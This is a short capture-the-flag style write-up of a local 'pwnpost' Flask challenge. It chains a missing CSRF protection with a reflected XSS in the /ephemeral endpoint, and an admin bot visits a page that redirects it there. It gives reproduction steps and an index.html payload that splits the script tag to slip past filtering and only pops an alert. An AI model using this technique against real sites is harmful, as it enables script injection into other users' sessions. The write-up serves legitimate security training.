## Description
The "pwnpost" Flask application has a reflected XSS vulnerability in the `/ephemeral` endpoint. Because the application lacks CSRF protection, an attacker can force an authenticated admin bot to visit a malicious page, which then redirects the bot to the vulnerable endpoint and executes arbitrary JavaScript.

## Reproduction Steps
1. Start the vulnerable server: `./challenge/server &`
2. Start the attacker server: `python3 -m http.server 1337`
3. Place `index.html` in the attacker server root.
4. Submit `http://hacker.localhost:1337` to the admin bot.
5. The bot logs in, visits the page, and the XSS triggers `alert("PWNED")`.

## Payload (`index.html`)
```html
<script>
    var payload = '<scr' + 'ipt>alert("PWNED")</scr' + 'ipt>';
    window.location.href = 'http://challenge.localhost/ephemeral?msg=' + encodeURIComponent(payload);
</script>
